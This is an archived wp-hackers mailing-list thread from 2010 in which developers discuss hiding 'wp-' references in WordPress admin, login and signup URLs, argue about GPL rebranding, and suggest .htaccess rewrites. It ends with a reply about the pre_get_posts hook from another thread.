From wpcustomizer at gmail.com  Mon Jul 26 16:41:08 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 09:41:08 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
Message-ID: <AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>

NOT true

wp-admin (user profiles)
wp-signup.php (creating an account)
wp-login.php (logging in)

On Mon, Jul 26, 2010 at 9:31 AM, Otto <otto at ottodestruct.com> wrote:

> On Mon, Jul 26, 2010 at 11:15 AM, WP Customizer <wpcustomizer at gmail.com>
> wrote:
> > @ Otto: Thats a fairly unusuaul situation.  I image the majority of users
> > have wp alone in its own folder.  and for using wp in a commercial
> venture
> > brading is everything and having wp- splattered all over urls, detracts
> from
> > the company's branding.  At the least you should be able to change these
> by
> > changing path variables in wp-config.php.
>
> Why would wp be all over your URLs? I think you're doing it wrong.
>
> The public facing URLs are controlled by your permalink settings. Only
> the backend, which presumably is not accessible to the public, has wp
> in the URLs.
>
> And for reference, you can redefine the wp-content directory all you
> like as setting in the config file. That's the only forward facing URL
> your users might see.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Mon Jul 26 16:43:42 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 26 Jul 2010 12:43:42 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com> 
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com> 
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com> 
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com> 
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com> 
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com> 
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
Message-ID: <AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>

On Mon, Jul 26, 2010 at 12:41 PM, WP Customizer <wpcustomizer at gmail.com>wrote:

> NOT true
>
> wp-admin (user profiles)


With admin profiles don't you have the larger issue of, well, the entire
admin looking like WordPress?

From wpcustomizer at gmail.com  Mon Jul 26 16:52:07 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 09:52:07 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
Message-ID: <AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>

Admin themes.

On Mon, Jul 26, 2010 at 9:43 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Mon, Jul 26, 2010 at 12:41 PM, WP Customizer <wpcustomizer at gmail.com
> >wrote:
>
> > NOT true
> >
> > wp-admin (user profiles)
>
>
> With admin profiles don't you have the larger issue of, well, the entire
> admin looking like WordPress?
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Mon Jul 26 16:54:42 2010
From: william.canino at googlemail.com (William Canino)
Date: Mon, 26 Jul 2010 12:54:42 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
Message-ID: <AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>

@Guy: neither do I.  What's bawx?  A pretentious spelling for box?

I am beginning to have an idea of what WPC wants to do.  She wants to
sell the WordPress source code under a different name.


On 26 July 2010 12:52, WP Customizer <wpcustomizer at gmail.com> wrote:
> Admin themes.
>
> On Mon, Jul 26, 2010 at 9:43 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
>> On Mon, Jul 26, 2010 at 12:41 PM, WP Customizer <wpcustomizer at gmail.com
>> >wrote:
>>
>> > NOT true
>> >
>> > wp-admin (user profiles)
>>
>>
>> With admin profiles don't you have the larger issue of, well, the entire
>> admin looking like WordPress?
>> ?_______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wpcustomizer at gmail.com  Mon Jul 26 17:01:48 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 10:01:48 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
Message-ID: <AANLkTi=NCeGuxLdU1y0iKvfXD8dQaVyGoCRfAdscCXFc@mail.gmail.com>

ok...actually I am writing theis program to remove wp- refrences that I am
licensing under GPL and will be publiclly releasing for anyone who wants to
hide wp- refrences in user facing urls to make it look nicer.

On Mon, Jul 26, 2010 at 9:54 AM, William Canino <
william.canino at googlemail.com> wrote:

> @Guy: neither do I.  What's bawx?  A pretentious spelling for box?
>
> I am beginning to have an idea of what WPC wants to do.  She wants to
> sell the WordPress source code under a different name.
>
>
> On 26 July 2010 12:52, WP Customizer <wpcustomizer at gmail.com> wrote:
> > Admin themes.
> >
> > On Mon, Jul 26, 2010 at 9:43 AM, Andrew Nacin <wp at andrewnacin.com>
> wrote:
> >
> >> On Mon, Jul 26, 2010 at 12:41 PM, WP Customizer <wpcustomizer at gmail.com
> >> >wrote:
> >>
> >> > NOT true
> >> >
> >> > wp-admin (user profiles)
> >>
> >>
> >> With admin profiles don't you have the larger issue of, well, the entire
> >> admin looking like WordPress?
> >>  _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From KrisY at tbs.uk.com  Mon Jul 26 17:07:34 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 26 Jul 2010 18:07:34 +0100
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com><AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com><AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com><AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com><AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com><AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com><AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com><AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com><AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E31AF@tbs-sbs01.TBS.local>

Thanks for posting on my behalf. It's pretty much exactly this.

Nicely said William.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of William Canino
Sent: 26 July 2010 17:55
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Rename wp-admin problems

@Guy: neither do I.  What's bawx?  A pretentious spelling for box?

I am beginning to have an idea of what WPC wants to do.  She wants to
sell the WordPress source code under a different name.


On 26 July 2010 12:52, WP Customizer <wpcustomizer at gmail.com> wrote:
> Admin themes.
>
> On Mon, Jul 26, 2010 at 9:43 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
>> On Mon, Jul 26, 2010 at 12:41 PM, WP Customizer <wpcustomizer at gmail.com
>> >wrote:
>>
>> > NOT true
>> >
>> > wp-admin (user profiles)
>>
>>
>> With admin profiles don't you have the larger issue of, well, the entire
>> admin looking like WordPress?
>> ?_______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From wphax at nullamatix.com  Mon Jul 26 17:19:34 2010
From: wphax at nullamatix.com (Guy)
Date: Mon, 26 Jul 2010 13:19:34 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
Message-ID: <AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>

On Mon, Jul 26, 2010 at 12:54 PM, William Canino
<william.canino at googlemail.com> wrote:
> @Guy: neither do I. ?What's bawx? ?A pretentious spelling for box?
>

Yes, was just a filler... "bawx" was the hostname of the server in my example.

"bawx ~$ " = "<host/server-name> <home-directory><access-level>"

Just a simple *nix prompt..

The rest was the "shell script" or commands as some would say.

> I am beginning to have an idea of what WPC wants to do. ?She wants to
> sell the WordPress source code under a different name.
>

Even if that's true, GPL permits this, right? As long as,
"NotWerdPress v1.0 Beta!" is also released open-source/GPL, right?

Guy
www.nullamatix.com

From wpcustomizer at gmail.com  Mon Jul 26 17:23:02 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 10:23:02 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
	<AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>
Message-ID: <AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>

Thanks Guy I didn't think about that but it is true. In fact if I remember
correctly I belive wp got its start by forking off another GPL blogging
platform.  But that doesn't reallymatter because as I said thats not what
I'm doing but you certainly are welcome to think that if you want, i really
don't care.

On Mon, Jul 26, 2010 at 10:19 AM, Guy <wphax at nullamatix.com> wrote:

> On Mon, Jul 26, 2010 at 12:54 PM, William Canino
> <william.canino at googlemail.com> wrote:
> > @Guy: neither do I.  What's bawx?  A pretentious spelling for box?
> >
>
> Yes, was just a filler... "bawx" was the hostname of the server in my
> example.
>
> "bawx ~$ " = "<host/server-name> <home-directory><access-level>"
>
> Just a simple *nix prompt..
>
> The rest was the "shell script" or commands as some would say.
>
> > I am beginning to have an idea of what WPC wants to do.  She wants to
> > sell the WordPress source code under a different name.
> >
>
> Even if that's true, GPL permits this, right? As long as,
> "NotWerdPress v1.0 Beta!" is also released open-source/GPL, right?
>
> Guy
> www.nullamatix.com
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wphax at nullamatix.com  Mon Jul 26 17:34:53 2010
From: wphax at nullamatix.com (Guy)
Date: Mon, 26 Jul 2010 13:34:53 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
	<AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>
	<AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>
Message-ID: <AANLkTinvDxPsaBdv-DSKC9OF5=OvkOa4DDiAvjZk2_HV@mail.gmail.com>

On Mon, Jul 26, 2010 at 1:23 PM, WP Customizer <wpcustomizer at gmail.com> wrote:
> [...] But that doesn't reallymatter because as I said thats not what
> I'm doing but you certainly are welcome to think that if you want, i really
> don't care.
>

Thank you for the permission to think freely, but I wasn't saying
whether or not that was your intention. To be honest, I really don't
care, either. No sweat off my back.

"GNU GPL or GTFO"  :]

Guy
www.nullamatix.com

From wpcustomizer at gmail.com  Mon Jul 26 17:44:44 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 10:44:44 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinvDxPsaBdv-DSKC9OF5=OvkOa4DDiAvjZk2_HV@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
	<AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>
	<AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>
	<AANLkTinvDxPsaBdv-DSKC9OF5=OvkOa4DDiAvjZk2_HV@mail.gmail.com>
Message-ID: <AANLkTinkzTUfw09wob6mbF5YQqowKouXS=GVjso4EWk5@mail.gmail.com>

Sorry if I didn't make that clear, that part of my comment was directed
towards everyone else.

On Mon, Jul 26, 2010 at 10:34 AM, Guy <wphax at nullamatix.com> wrote:

> On Mon, Jul 26, 2010 at 1:23 PM, WP Customizer <wpcustomizer at gmail.com>
> wrote:
> > [...] But that doesn't reallymatter because as I said thats not what
> > I'm doing but you certainly are welcome to think that if you want, i
> really
> > don't care.
> >
>
> Thank you for the permission to think freely, but I wasn't saying
> whether or not that was your intention. To be honest, I really don't
> care, either. No sweat off my back.
>
> "GNU GPL or GTFO"  :]
>
> Guy
> www.nullamatix.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Mon Jul 26 17:46:23 2010
From: william.canino at googlemail.com (William Canino)
Date: Mon, 26 Jul 2010 13:46:23 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
	<AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com>
	<AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com>
	<AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com>
	<AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com>
	<AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com>
Message-ID: <AANLkTintx0+wt9TmdDxO9H+qkZJF+JAxTmHGQ6M++o3f@mail.gmail.com>

Yes the GPL allows it.

Going back to your WPC's initial question.  The CSS is loading fine,
it's that the appropriate elements aren't hidden or manipulated.  I
suggest you check load-scripts.php for the problem.

I hope this helps.


On 26 July 2010 13:23, WP Customizer <wpcustomizer at gmail.com> wrote:
> Thanks Guy I didn't think about that but it is true. In fact if I remember
> correctly I belive wp got its start by forking off another GPL blogging
> platform. ?But that doesn't reallymatter because as I said thats not what
> I'm doing but you certainly are welcome to think that if you want, i really
> don't care.
>
> On Mon, Jul 26, 2010 at 10:19 AM, Guy <wphax at nullamatix.com> wrote:
>
>> On Mon, Jul 26, 2010 at 12:54 PM, William Canino
>> <william.canino at googlemail.com> wrote:
>> > @Guy: neither do I. ?What's bawx? ?A pretentious spelling for box?
>> >
>>
>> Yes, was just a filler... "bawx" was the hostname of the server in my
>> example.
>>
>> "bawx ~$ " = "<host/server-name> <home-directory><access-level>"
>>
>> Just a simple *nix prompt..
>>
>> The rest was the "shell script" or commands as some would say.
>>
>> > I am beginning to have an idea of what WPC wants to do. ?She wants to
>> > sell the WordPress source code under a different name.
>> >
>>
>> Even if that's true, GPL permits this, right? As long as,
>> "NotWerdPress v1.0 Beta!" is also released open-source/GPL, right?
>>
>> Guy
>> www.nullamatix.com
>> ?_______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Mon Jul 26 18:09:24 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 13:09:24 -0500 (CDT)
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
	<AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>
	<AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com>
Message-ID: <81E3A50C-74AD-42A8-816D-2EC6A7F677AF@newclarity.net>

Have you thought about using a custom .htaccess file to route wp-* to just * and to redirect from any incomIng URLs to their new equivalents?

-Mike


On Jul 26, 2010, at 12:41 PM, WP Customizer <wpcustomizer at gmail.com> wrote:

> NOT true
> 
> wp-admin (user profiles)
> wp-signup.php (creating an account)
> wp-login.php (logging in)
> 
> On Mon, Jul 26, 2010 at 9:31 AM, Otto <otto at ottodestruct.com> wrote:
> 
>> On Mon, Jul 26, 2010 at 11:15 AM, WP Customizer <wpcustomizer at gmail.com>
>> wrote:
>>> @ Otto: Thats a fairly unusuaul situation.  I image the majority of users
>>> have wp alone in its own folder.  and for using wp in a commercial
>> venture
>>> brading is everything and having wp- splattered all over urls, detracts
>> from
>>> the company's branding.  At the least you should be able to change these
>> by
>>> changing path variables in wp-config.php.
>> 
>> Why would wp be all over your URLs? I think you're doing it wrong.
>> 
>> The public facing URLs are controlled by your permalink settings. Only
>> the backend, which presumably is not accessible to the public, has wp
>> in the URLs.
>> 
>> And for reference, you can redefine the wp-content directory all you
>> like as setting in the config file. That's the only forward facing URL
>> your users might see.
>> 
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Mon Jul 26 18:24:03 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 14:24:03 -0400
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
Message-ID: <73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>

On Jul 26, 2010, at 12:28 PM, Andrew Nacin wrote:
> On Mon, Jul 26, 2010 at 11:13 AM, John Blackbourn
>> wrote:
>> I'm writing a plugin which adds a filter to pre_get_posts but the
>> filter should only apply when we're dealing with the main WordPress
>> loop (ie. the one which is constructed using the query string). There
>> can potentially be several loops on any given page, and the main loop
>> may not be the first loop on the page (so I can't apply the filter and
>> then remove it at the end of the first loop).
>> 
>> How can I determine if the current loop is the "main" loop constructed
>> from the query string without having to touch the loop code in the
>> template?
> 
> Contrary to the advice of many a tutorial, the pre_get_posts hook is almost
> always the wrong hook to use here. Please look at the parse_request and
> request hooks, and also a wp-hackers thread from a few days ago titled
> "pre_get_posts problem".

